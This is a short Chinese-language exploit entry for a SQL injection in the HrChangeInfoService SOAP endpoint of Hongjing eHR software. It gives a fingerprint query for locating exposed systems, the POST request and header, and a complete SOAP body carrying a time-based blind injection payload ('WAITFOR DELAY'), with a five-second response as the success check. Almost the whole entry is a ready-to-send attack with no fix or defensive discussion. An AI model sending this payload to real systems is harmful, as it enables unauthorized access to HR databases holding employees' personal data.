# 宏景eHRHrChangeInfoService存在SQL注入漏洞

- **系统**：宏景　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="HJSOFT-HCM"`
- **请求**：`POST /services/HrChangeInfoService HTTP/1.1`
- **关键头**：`Content-Type: application/xml`

**请求体 / payload**
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:hr="http://www.hjsj.com/HrChangeInfoService">
<soapenv:Header/>
<soapenv:Body>
<hr:getChangeUsers>
<arg0>
</arg0>
<arg1>admin';WAITFOR DELAY '0:0:5'--</arg1>
<arg2>1</arg2>
</hr:getChangeUsers>
</soapenv:Body>
</soapenv:Envelope>
:---
```
- **预期**：200　|　响应时间>=5s